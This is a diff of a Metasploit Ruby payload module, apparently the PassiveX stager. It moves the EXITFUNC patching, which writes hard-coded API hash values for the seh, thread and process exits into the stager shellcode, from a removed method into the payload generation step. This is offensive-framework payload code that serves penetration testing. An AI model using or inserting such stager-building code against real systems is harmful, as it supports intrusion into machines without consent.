@@ -82,6 +82,19 @@ module Metasploit3
 		# Generate the payload
 		p = super
 
+		# we must manually patch in the exit funk for this stager as it uses the old hash values
+		# which are generated using a different algorithm to that of the new hash values. We do this
+		# as this stager code has not been rewritten using the new api calling technique (see block_api.asm).
+		
+		# set a default exitfunk if one is not set
+		datastore['EXITFUNC'] = 'thread' if not datastore['EXITFUNC']
+		# retrieve the offset/pack type for this stager's exitfunk
+		offset, pack = offsets['EXITFUNC']
+		# patch in the appropriate exit funk (using the old exit funk hashes).
+		p[offset, 4] = [ 0x5F048AF0 ].pack(pack || 'V') if datastore['EXITFUNC'] == 'seh' 
+		p[offset, 4] = [ 0x60E0CEEF ].pack(pack || 'V') if datastore['EXITFUNC'] == 'thread'
+		p[offset, 4] = [ 0x73E2D87E ].pack(pack || 'V') if datastore['EXITFUNC'] == 'process'
+
 		# Construct the full URL that will be embedded in the payload.  The uri
 		# attribute is derived from the value that will have been set by the
 		# passivex handler.
@@ -102,18 +115,5 @@ module Metasploit3
 		# Return the updated payload
 		return p
 	end
-	
-	# for now we must let this payload use the old EXITFUNC hash values.
-	def replace_var(raw, name, offset, pack)
-		super
-		if( name == 'EXITFUNC' )
-			datastore[name] = 'thread' if not datastore[name]
-			raw[offset, 4] = [ 0x5F048AF0 ].pack(pack || 'V') if datastore[name] == 'seh' 
-			raw[offset, 4] = [ 0x60E0CEEF ].pack(pack || 'V') if datastore[name] == 'thread'
-			raw[offset, 4] = [ 0x73E2D87E ].pack(pack || 'V') if datastore[name] == 'process'
-			return true
-		end
-		return false
-	end
-	
+
 end
